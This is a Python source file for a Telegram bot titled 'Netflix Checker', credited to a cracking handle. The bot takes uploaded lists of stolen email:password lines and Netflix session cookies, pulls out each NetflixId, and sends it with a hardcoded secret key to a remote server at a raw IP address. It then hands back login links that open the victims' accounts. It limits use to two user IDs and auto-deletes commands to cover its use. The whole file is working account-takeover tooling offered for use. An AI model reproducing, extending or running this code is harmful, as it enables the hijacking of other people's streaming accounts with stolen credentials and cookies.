import logging
import requests
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
import os
from dotenv import load_dotenv
from pathlib import Path
import time
from collections import defaultdict
import asyncio
import re
import json
import urllib.parse

# Load environment variables
env_path = Path(__file__).parent / '.env'
load_dotenv(dotenv_path=env_path)

# ==================== YOUR API CONFIGURATION ====================
TOKEN = os.getenv('BOT_TOKEN')
API_URL = "http://104.223.121.139:6969/api/gen"  # YOUR API
SECRET_KEY = "IpYDCxU9VAxqi88ByaVscqTNDJPg7Cg5"  # YOUR SECRET KEY

# YOUR CREDIT
YOUR_CREDIT = "@CrackByLIM"

# ==================== AUTHORIZED USERS ====================
AUTHORIZED_USERS = [1058484190, 6247762383]  # Only these users can use the bot

if not TOKEN:
    print("❌ ERROR: BOT_TOKEN not found!")
    exit(1)

# ==================== MULTI-LANGUAGE SUPPORT ====================

LANGUAGES = {
    'en': {
        'name': 'English',
        'flag': '🇺🇸',
        'welcome': 'Welcome',
        'start': 'Start',
        'help': 'Help',
        'stats': 'Statistics',
        'clear': 'Clear',
        'language': 'Language',
        'processing': 'Processing',
        'valid': '✅ VALID',
        'invalid': '❌ INVALID',
        'email': 'Email',
        'password': 'Password',
        'country': 'Country',
        'phone': 'Phone',
        'plan': 'Plan',
        'quality': 'Quality',
        'streams': 'Max Streams',
        'login_link': 'Login Link',
        'launch': '🎬 OPEN NETFLIX',
        'powered_by': 'Powered by',
        'file_received': '📁 FILE RECEIVED',
        'analyzing': '🔍 ANALYZING',
        'complete': '✨ COMPLETE',
        'results': 'RESULTS',
        'valid_found': 'Valid Found',
        'invalid_found': 'Invalid',
        'success_rate': 'Success Rate',
        'no_valid': 'No valid accounts found',
        'error_occurred': '⚠️ Error',
        'rate_limit': 'Please wait a moment',
        'wrong_format': 'Please upload a .txt file',
        'member_since': 'Member Since',
        'payment_method': 'Payment',
        'next_billing': 'Next Billing',
        'extra_member': 'Extra Member',
        'check_command': 'Check Netflix ID',
        'enter_cookie': 'Please enter a Netflix ID',
        'checking': '⏳ Checking',
        'cookie_valid': '✅ VALID',
        'cookie_invalid': '❌ INVALID',
        'how_to_use': 'HOW TO USE',
        'instruction': 'Click the button below to open Netflix',
        'unauthorized': '⛔ Access Denied',
        'no_permission': 'You are not authorized to use this bot.',
        'click_to_open': '🎬 OPEN NETFLIX',
        'command_deleted': '✅ Your command has been deleted for privacy',
    },
    'zh': {
        'name': '中文',
        'flag': '🇨🇳',
        'welcome': '欢迎',
        'start': '开始',
        'help': '帮助',
        'stats': '统计',
        'clear': '清除',
        'language': '语言',
        'processing': '处理中',
        'valid': '✅ 有效',
        'invalid': '❌ 无效',
        'email': '邮箱',
        'password': '密码',
        'country': '国家',
        'phone': '电话',
        'plan': '套餐',
        'quality': '画质',
        'streams': '最大流',
        'login_link': '登录链接',
        'launch': '🎬 打开Netflix',
        'powered_by': '技术支持',
        'file_received': '📁 已接收文件',
        'analyzing': '🔍 分析中',
        'complete': '✨ 完成',
        'results': '结果',
        'valid_found': '有效账户',
        'invalid_found': '无效账户',
        'success_rate': '成功率',
        'no_valid': '未找到有效账户',
        'error_occurred': '⚠️ 错误',
        'rate_limit': '请稍等片刻',
        'wrong_format': '请上传.txt文件',
        'member_since': '加入时间',
        'payment_method': '支付方式',
        'next_billing': '下次计费',
        'extra_member': '额外成员',
        'check_command': '检查Netflix ID',
        'enter_cookie': '请输入Netflix ID',
        'checking': '⏳ 检查中',
        'cookie_valid': '✅ 有效',
        'cookie_invalid': '❌ 无效',
        'how_to_use': '使用方法',
        'instruction': '点击下方按钮打开Netflix',
        'unauthorized': '⛔ 访问被拒绝',
        'no_permission': '您无权使用此机器人。',
        'click_to_open': '🎬 打开Netflix',
        'command_deleted': '✅ 您的命令已删除以保护隐私',
    },
    'km': {
        'name': 'ខ្មែរ',
        'flag': '🇰🇭',
        'welcome': 'ស្វាគមន៍',
        'start': 'ចាប់ផ្តើម',
        'help': 'ជំនួយ',
        'stats': 'ស្ថិតិ',
        'clear': 'សម្អាត',
        'language': 'ភាសា',
        'processing': 'កំពុងដំណើរការ',
        'valid': '✅ ត្រឹមត្រូវ',
        'invalid': '❌ មិនត្រឹមត្រូវ',
        'email': 'អ៊ីមែល',
        'password': 'ពាក្យសម្ងាត់',
        'country': 'ប្រទេស',
        'phone': 'ទូរស័ព្ទ',
        'plan': 'កញ្ចប់',
        'quality': 'គុណភាព',
        'streams': 'ស្ទ្រីម',
        'login_link': 'តំណចូល',
        'launch': '🎬 បើក Netflix',
        'powered_by': 'ដំណើរការដោយ',
        'file_received': '📁 បានទទួលឯកសារ',
        'analyzing': '🔍 កំពុងវិភាគ',
        'complete': '✨ បញ្ចប់',
        'results': 'លទ្ធផល',
        'valid_found': 'គណនីត្រឹមត្រូវ',
        'invalid_found': 'គណនីមិនត្រឹមត្រូវ',
        'success_rate': 'អត្រាជោគជ័យ',
        'no_valid': 'រកមិនឃើញគណនីត្រឹមត្រូវទេ',
        'error_occurred': '⚠️ មានបញ្ហា',
        'rate_limit': 'សូមរង់ចាំបន្តិច',
        'wrong_format': 'សូមផ្ញើឯកសារ .txt',
        'member_since': 'សមាជិកតាំងពី',
        'payment_method': 'វិធីបង់ប្រាក់',
        'next_billing': 'វិក្កយបត្របន្ទាប់',
        'extra_member': 'សមាជិកបន្ថែម',
        'check_command': 'ពិនិត្យ Netflix ID',
        'enter_cookie': 'សូមបញ្ចូល Netflix ID',
        'checking': '⏳ កំពុងពិនិត្យ',
        'cookie_valid': '✅ ត្រឹមត្រូវ',
        'cookie_invalid': '❌ មិនត្រឹមត្រូវ',
        'how_to_use': 'របៀបប្រើ',
        'instruction': 'ចុចប៊ូតុងខាងក្រោមដើម្បីបើក Netflix',
        'unauthorized': '⛔ គ្មានការអនុញ្ញាត',
        'no_permission': 'អ្នកមិនត្រូវបានអនុញ្ញាតឱ្យប្រើប្រាស់ម៉ាស៊ីននេះទេ។',
        'click_to_open': '🎬 បើក Netflix',
        'command_deleted': '✅ ពាក្យបញ្ជារបស់អ្នកត្រូវបានលុបសម្រាប់ឯកជនភាព',
    }
}

# ==================== AUTO DELETE COMMAND FUNCTION ====================

async def delete_user_command(context: ContextTypes.DEFAULT_TYPE):
    """Delete the user's command message after delay"""
    job = context.job
    try:
        await context.bot.delete_message(chat_id=job.chat_id, message_id=job.data)
    except Exception as e:
        logger.error(f"Failed to delete command: {e}")

def schedule_command_deletion(context: ContextTypes.DEFAULT_TYPE, chat_id: int, message_id: int, delay: int = 5):
    """Schedule the user's command message for deletion"""
    context.job_queue.run_once(
        delete_user_command,
        delay,
        data=message_id,
        chat_id=chat_id,
        name=f"delete_cmd_{message_id}"
    )

# ==================== AUTHORIZATION DECORATOR ====================

def authorized_only(func):
    """Decorator to restrict access to authorized users only"""
    async def wrapper(update: Update, context: ContextTypes.DEFAULT_TYPE, *args, **kwargs):
        user_id = update.effective_user.id
        
        # Check if user is authorized
        if user_id not in AUTHORIZED_USERS:
            lang_code = get_lang(user_id)
            lang = LANGUAGES[lang_code]
            
            logger.warning(f"🚫 Unauthorized access attempt by user ID: {user_id}")
            
            # Send unauthorized message
            await update.message.reply_text(
                f"**{lang['unauthorized']}**\n\n{lang['no_permission']}",
                parse_mode='Markdown'
            )
            return
        
        # User is authorized, proceed with the original function
        return await func(update, context, *args, **kwargs)
    return wrapper

# ==================== FIX FOR CONFLICT ERROR ====================
def clear_telegram_webhook():
    """Clear any existing webhook/sessions to prevent conflict"""
    try:
        webhook_url = f"https://api.telegram.org/bot{TOKEN}/deleteWebhook"
        response = requests.post(webhook_url)
        print(f"✅ Webhook cleared: {response.json()}")
        
        get_updates_url = f"https://api.telegram.org/bot{TOKEN}/getUpdates"
        requests.post(get_updates_url, json={"offset": -1, "timeout": 0})
        print("✅ Pending updates cleared")
        
        time.sleep(2)
    except Exception as e:
        print(f"⚠️ Warning while clearing webhook: {e}")

# Call this before starting the bot
clear_telegram_webhook()
# =============================================================

# Enable logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# User session storage
user_sessions = {}
rate_limits = defaultdict(list)

# Stats tracking
total_checks = 0
valid_accounts = 0
invalid_accounts = 0

# ==================== NETFLIX ID EXTRACTOR ====================

def extract_netflix_id_from_cookie(cookie_text):
    """
    Extract NetflixId from various cookie formats
    """
    if not cookie_text:
        return None
    
    patterns = [
        r'NetflixId=([^&\s]+)',
        r'netflixid=([^&\s]+)',
        r'NetflixId%3D([^&\s]+)',
        r'netflixid%3D([^&\s]+)',
    ]
    
    for pattern in patterns:
        match = re.search(pattern, cookie_text, re.IGNORECASE)
        if match:
            netflix_id = match.group(1).strip()
            return netflix_id
    
    return cookie_text

# ==================== ENHANCED FORMAT PARSER ====================

def parse_account_line(line):
    """
    Parse a single line in either format
    """
    try:
        line = line.strip()
        if not line:
            return None
        
        account = {}
        
        # First, extract email:password from the beginning
        parts = line.split('|', 1)
        first_part = parts[0].strip()
        
        # Parse email:password
        if ':' in first_part:
            email_pass = first_part.split(':', 1)
            account['email'] = email_pass[0].strip()
            account['password'] = email_pass[1].strip()
        else:
            email_pass_match = re.search(r'([^\s:]+):([^\s|]+)', first_part)
            if email_pass_match:
                account['email'] = email_pass_match.group(1).strip()
                account['password'] = email_pass_match.group(2).strip()
        
        # If we have more parts after the first |
        if len(parts) > 1:
            remaining = parts[1]
            
            # Check which format we're dealing with
            if '=' in remaining and ':' not in remaining:
                # Format 2: Using = as separator
                fields = remaining.split('|')
                for field in fields:
                    field = field.strip()
                    if '=' in field:
                        key, value = field.split('=', 1)
                        key = key.strip()
                        value = value.strip()
                        
                        key_lower = key.lower()
                        
                        if 'phonenumber' in key_lower or 'phone' in key_lower:
                            account['phone'] = value
                        elif 'country' in key_lower:
                            account['country'] = value
                        elif 'plan' in key_lower:
                            account['plan'] = value
                        elif 'videoquality' in key_lower or 'quality' in key_lower:
                            account['quality'] = value
                        elif 'maxstreams' in key_lower or 'streams' in key_lower:
                            account['streams'] = value
                        elif 'netflixcookies' in key_lower or 'cookie' in key_lower or 'netflixid' in key_lower:
                            account['full_cookie'] = value
                            netflix_id = extract_netflix_id_from_cookie(value)
                            if netflix_id:
                                account['netflix_id'] = netflix_id
                        elif 'membersince' in key_lower:
                            account['member_since'] = value
                        elif 'paymentmethod' in key_lower:
                            account['payment_method'] = value
            
            else:
                # Format 1: Using : as separator
                fields = remaining.split('|')
                for field in fields:
                    field = field.strip()
                    if ':' in field:
                        key, value = field.split(':', 1)
                        key = key.strip().lower()
                        value = value.strip()
                        
                        if 'phone' in key:
                            account['phone'] = value
                        elif 'country' in key:
                            account['country'] = value
                        elif 'cookie' in key:
                            account['full_cookie'] = value
                            netflix_id = extract_netflix_id_from_cookie(value)
                            if netflix_id:
                                account['netflix_id'] = netflix_id
        
        # If we still don't have netflix_id, try to find it anywhere in the line
        if 'netflix_id' not in account:
            netflix_id = extract_netflix_id_from_cookie(line)
            if netflix_id:
                account['netflix_id'] = netflix_id
                if 'email' not in account:
                    email_match = re.search(r'([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})', line)
                    if email_match:
                        account['email'] = email_match.group(1)
        
        if 'netflix_id' not in account:
            return None
        
        if 'email' not in account:
            account['email'] = f"user_{account['netflix_id'][:8]}@unknown.com"
            account['password'] = "••••••••"
        
        return account
        
    except Exception as e:
        logger.error(f"Error parsing line: {e}")
        return None

# ==================== YOUR API FUNCTIONS ====================

async def check_with_your_api(netflix_id, email="unknown@email.com"):
    """Check Netflix ID using YOUR API"""
    
    if not netflix_id:
        return {
            "success": False,
            "error": "No Netflix ID provided",
            "error_code": "MISSING_NETFLIX_ID",
            "email": email
        }
    
    try:
        url = "http://104.223.121.139:6969/api/gen"
        
        data = {
            "netflix_id": netflix_id,
            "secret_key": SECRET_KEY
        }
        
        logger.info(f"📡 Calling API for {email}")
        
        response = requests.post(url, json=data, timeout=15)
        result = response.json()
        
        if result.get('success'):
            login_url = result.get('login_url')
            if login_url:
                return {
                    "success": True,
                    "login_url": login_url,
                    "email": email,
                }
            else:
                return {
                    "success": False,
                    "error": "No login URL generated",
                    "error_code": "MISSING_URL",
                    "email": email
                }
        else:
            error_msg = result.get('error', 'Invalid or expired')
            return {
                "success": False,
                "error": error_msg,
                "error_code": result.get('error_code', 'INVALID'),
                "email": email
            }
                
    except Exception as e:
        return {
            "success": False,
            "error": "Service unavailable",
            "error_code": "ERROR",
            "email": email
        }

# ==================== LANGUAGE SELECTION ====================

async def language_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show language selection menu"""
    if update.effective_user.id not in AUTHORIZED_USERS:
        return
    
    # Schedule command deletion
    schedule_command_deletion(context, update.effective_chat.id, update.message.message_id, 3)
    
    keyboard = [
        [
            InlineKeyboardButton(f"{LANGUAGES['en']['flag']} English", callback_data='lang_en'),
            InlineKeyboardButton(f"{LANGUAGES['zh']['flag']} 中文", callback_data='lang_zh'),
        ],
        [
            InlineKeyboardButton(f"{LANGUAGES['km']['flag']} ខ្មែរ", callback_data='lang_km'),
        ]
    ]
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        "🌐 **Select your language**",
        reply_markup=reply_markup,
        parse_mode='Markdown'
    )

async def language_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle language selection"""
    if update.effective_user.id not in AUTHORIZED_USERS:
        await update.callback_query.answer("⛔ Unauthorized")
        return
    
    query = update.callback_query
    await query.answer()
    
    user_id = query.from_user.id
    lang_code = query.data.replace('lang_', '')
    
    if user_id not in user_sessions:
        user_sessions[user_id] = {}
    user_sessions[user_id]['language'] = lang_code
    
    lang = LANGUAGES[lang_code]
    
    await query.edit_message_text(
        f"✅ **{lang['flag']} {lang['name']} selected**",
        parse_mode='Markdown'
    )

def get_lang(user_id):
    """Get user's selected language"""
    if user_id in user_sessions and 'language' in user_sessions[user_id]:
        return user_sessions[user_id]['language']
    return 'en'

# ==================== BOT COMMANDS ====================

@authorized_only
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Start command with clean output"""
    # Schedule command deletion
    schedule_command_deletion(context, update.effective_chat.id, update.message.message_id, 3)
    
    user = update.effective_user
    user_id = user.id
    lang_code = get_lang(user_id)
    lang = LANGUAGES[lang_code]
    
    welcome = f"""
**🎬 Netflix Checker** {lang['flag']}

{lang['welcome']} **{user.first_name}**!

**📤 Send .txt file** with accounts
**🔍 /check** for single Netflix ID

**Commands:**
/help - {lang['help']}
/stats - {lang['stats']}
/language - {lang['language']}
/clear - {lang['clear']}

━━━━━━━━━━━━━━━━━━━━
{lang['powered_by']} {YOUR_CREDIT}
    """
    
    await update.message.reply_text(welcome, parse_mode='Markdown')

@authorized_only
async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Help command"""
    # Schedule command deletion
    schedule_command_deletion(context, update.effective_chat.id, update.message.message_id, 3)
    
    user_id = update.effective_user.id
    lang_code = get_lang(user_id)
    lang = LANGUAGES[lang_code]
    
    help_text = f"""
**🆘 {lang['help']}**

**Format:**
`email:pass | Country=US | NetflixCookies=NetflixId=...`

**Example:**
`user@gmail.com:pass123 | Country=US | NetflixCookies=NetflixId=v%3D...`

**Single check:**
`/check YOUR_NETFLIX_ID`

━━━━━━━━━━━━━━━━━━━━
{lang['powered_by']} {YOUR_CREDIT}
    """
    
    await update.message.reply_text(help_text, parse_mode='Markdown')

@authorized_only
async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show statistics"""
    # Schedule command deletion
    schedule_command_deletion(context, update.effective_chat.id, update.message.message_id, 3)
    
    global total_checks, valid_accounts, invalid_accounts
    user_id = update.effective_user.id
    lang_code = get_lang(user_id)
    lang = LANGUAGES[lang_code]
    
    success_rate = valid_accounts/total_checks*100 if total_checks > 0 else 0
    
    stats_text = f"""
**📊 {lang['stats']}**

✅ **{lang['valid_found']}:** `{valid_accounts}`
❌ **{lang['invalid_found']}:** `{invalid_accounts}`
📈 **{lang['success_rate']}:** `{success_rate:.1f}%`

━━━━━━━━━━━━━━━━━━━━
{lang['powered_by']} {YOUR_CREDIT}
    """
    
    await update.message.reply_text(stats_text, parse_mode='Markdown')

@authorized_only
async def clear_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Clear user session"""
    # Schedule command deletion
    schedule_command_deletion(context, update.effective_chat.id, update.message.message_id, 3)
    
    user_id = update.effective_user.id
    lang_code = get_lang(user_id)
    lang = LANGUAGES[lang_code]
    
    if user_id in user_sessions:
        lang_pref = user_sessions[user_id].get('language', 'en')
        user_sessions[user_id] = {'language': lang_pref}
    
    await update.message.reply_text(
        f"✅ **{lang['clear']}**\n\nYou can upload a new file.",
        parse_mode='Markdown'
    )

# ==================== CHECK COMMAND ====================

@authorized_only
async def check_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Check a single Netflix ID"""
    user_id = update.effective_user.id
    lang_code = get_lang(user_id)
    lang = LANGUAGES[lang_code]
    
    global total_checks, valid_accounts, invalid_accounts
    
    # Schedule command deletion (delete after 3 seconds)
    schedule_command_deletion(context, update.effective_chat.id, update.message.message_id, 3)
    
    if not check_rate_limit(user_id):
        await update.message.reply_text(
            f"⏰ **{lang['rate_limit']}**",
            parse_mode='Markdown'
        )
        return
    
    if not context.args:
        await update.message.reply_text(
            f"""
**{lang['check_command']}**

📝 `/{lang['check_command'].lower()} YOUR_NETFLIX_ID`

**Example:**
`/check v%3D3%26ct%3DBgjH...`
            """,
            parse_mode='Markdown'
        )
        return
    
    user_input = ' '.join(context.args)
    
    # Clean up the input
    if 'NetflixId=' in user_input or 'netflixid=' in user_input:
        match = re.search(r'NetflixId=([^\s]+)', user_input, re.IGNORECASE)
        netflix_id = match.group(1) if match else user_input
    else:
        netflix_id = user_input
    
    netflix_id = netflix_id.strip('"\'')
    
    # Show checking message
    checking_msg = await update.message.reply_text(
        f"**{lang['checking']}** 🔍",
        parse_mode='Markdown'
    )
    
    # Check with API
    result = await check_with_your_api(netflix_id, f"manual_{netflix_id[:8]}")
    
    total_checks += 1
    
    # Delete checking message
    try:
        await checking_msg.delete()
    except:
        pass
    
    if result.get('success'):
        valid_accounts += 1
        
        # Clean success message - NO LONG URL SHOWN
        success_msg = f"""
**{lang['cookie_valid']}**

━━━━━━━━━━━━━━━━━━━━
**ID:** `{netflix_id[:20]}...`

📌 **{lang['instruction']}**
        """
        
        keyboard = [[InlineKeyboardButton(lang['click_to_open'], url=result['login_url'])]]
        
        # Send success message with button
        await update.message.reply_text(
            success_msg,
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode='Markdown'
        )
            
    else:
        invalid_accounts += 1
        
        # Clean error message
        error_msg = f"""
**{lang['cookie_invalid']}**

━━━━━━━━━━━━━━━━━━━━
**ID:** `{netflix_id[:20]}...`

💡 **Please check and try again**
        """
        
        await update.message.reply_text(error_msg, parse_mode='Markdown')

# ==================== FILE HANDLER ====================

@authorized_only
async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle uploaded .txt files"""
    user_id = update.effective_user.id
    lang_code = get_lang(user_id)
    lang = LANGUAGES[lang_code]
    
    global total_checks, valid_accounts, invalid_accounts
    
    # Schedule command deletion (delete the file message after 3 seconds)
    schedule_command_deletion(context, update.effective_chat.id, update.message.message_id, 3)
    
    if not check_rate_limit(user_id):
        await update.message.reply_text(
            f"⏰ **{lang['rate_limit']}**",
            parse_mode='Markdown'
        )
        return
    
    document = update.message.document
    
    if not document.file_name.endswith('.txt'):
        await update.message.reply_text(
            f"❌ **{lang['wrong_format']}**",
            parse_mode='Markdown'
        )
        return
    
    # Progress message
    progress_msg = await update.message.reply_text(
        f"**{lang['file_received']}**\n⏳ **{lang['processing']}**...",
        parse_mode='Markdown'
    )
    
    try:
        file = await context.bot.get_file(document.file_id)
        file_content = await file.download_as_bytearray()
        content = file_content.decode('utf-8', errors='ignore')
        
        lines = content.split('\n')
        accounts = [line.strip() for line in lines if line.strip()]
        
        await progress_msg.edit_text(
            f"**{lang['analyzing']}**\n🔍 Found: `{len(accounts)}` accounts",
            parse_mode='Markdown'
        )
        
        valid_count = 0
        invalid_count = 0
        
        for i, line in enumerate(accounts, 1):
            account = parse_account_line(line)
            
            if not account:
                invalid_count += 1
                continue
            
            # Update progress every few accounts
            if i % 3 == 0 or i == len(accounts):
                await progress_msg.edit_text(
                    f"**{lang['processing']}**\n📊 `{i}/{len(accounts)}`\n✅ `{valid_count}` ❌ `{invalid_count}`",
                    parse_mode='Markdown'
                )
            
            result = await check_with_your_api(account['netflix_id'], account['email'])
            
            total_checks += 1
            
            if result.get('success'):
                valid_count += 1
                valid_accounts += 1
                
                # Build details line
                details = []
                if account.get('country'):
                    details.append(f"🌍 {account['country']}")
                if account.get('plan'):
                    details.append(f"📺 {account['plan']}")
                if account.get('quality'):
                    details.append(f"🎨 {account['quality']}")
                
                details_str = ' | '.join(details) if details else ''
                
                # Clean valid message - NO LONG URL
                msg = f"""
**{lang['valid']}** ✨

**📧 {lang['email']}:** `{account['email']}`
{details_str}

📌 **{lang['instruction']}**
                """
                
                keyboard = [[InlineKeyboardButton(lang['click_to_open'], url=result['login_url'])]]
                
                # Send valid account
                await update.message.reply_text(
                    msg,
                    reply_markup=InlineKeyboardMarkup(keyboard),
                    parse_mode='Markdown'
                )
                
            else:
                invalid_count += 1
                invalid_accounts += 1
            
            await asyncio.sleep(0.5)
        
        # Final summary
        success_rate = valid_count/len(accounts)*100 if len(accounts) > 0 else 0
        
        if valid_count > 0:
            summary = f"""
**{lang['complete']}** ✨

✅ **{lang['valid_found']}:** `{valid_count}`
❌ **{lang['invalid_found']}:** `{invalid_count}`
📈 **{lang['success_rate']}:** `{success_rate:.1f}%`
            """
        else:
            summary = f"""
**{lang['no_valid']}** ❌

❌ **{lang['invalid_found']}:** `{invalid_count}`
            """
        
        await progress_msg.edit_text(summary, parse_mode='Markdown')
        
    except Exception as e:
        logger.error(f"Error: {e}")
        await progress_msg.edit_text(
            f"**{lang['error_occurred']}**\n💡 Please try again",
            parse_mode='Markdown'
        )

# ==================== RATE LIMITING ====================

def check_rate_limit(user_id, limit=5, period=60):
    now = time.time()
    rate_limits[user_id] = [t for t in rate_limits[user_id] if now - t < period]
    if len(rate_limits[user_id]) >= limit:
        return False
    rate_limits[user_id].append(now)
    return True

# ==================== MAIN FUNCTION ====================

async def run_bot():
    """Run the bot"""
    print("=" * 50)
    print("🎬 NETFLIX CHECKER BOT")
    print("=" * 50)
    print(f"✅ Authorized Users: {len(AUTHORIZED_USERS)}")
    print("✅ Command auto-delete enabled (3 seconds)")
    print("✅ Clean output - no scary links")
    print("=" * 50)
    
    app = Application.builder().token(TOKEN).build()
    
    # Add handlers
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(CommandHandler("stats", stats_command))
    app.add_handler(CommandHandler("clear", clear_command))
    app.add_handler(CommandHandler("language", language_command))
    app.add_handler(CommandHandler("check", check_command))
    app.add_handler(CallbackQueryHandler(language_callback, pattern="^lang_"))
    app.add_handler(MessageHandler(filters.Document.FileExtension("txt"), handle_file))
    
    await app.initialize()
    await app.start()
    await app.updater.start_polling(drop_pending_updates=True)
    
    print("✅ Bot is running!")
    print("=" * 50)
    
    try:
        while True:
            await asyncio.sleep(1)
    except KeyboardInterrupt:
        print("\n👋 Bot stopped")
    finally:
        await app.updater.stop()
        await app.stop()
        await app.shutdown()

def main():
    """Main entry point"""
    try:
        asyncio.run(run_bot())
    except KeyboardInterrupt:
        print("\n👋 Bot stopped")
    except Exception as e:
        print(f"❌ Error: {e}")

if __name__ == '__main__':
    main()
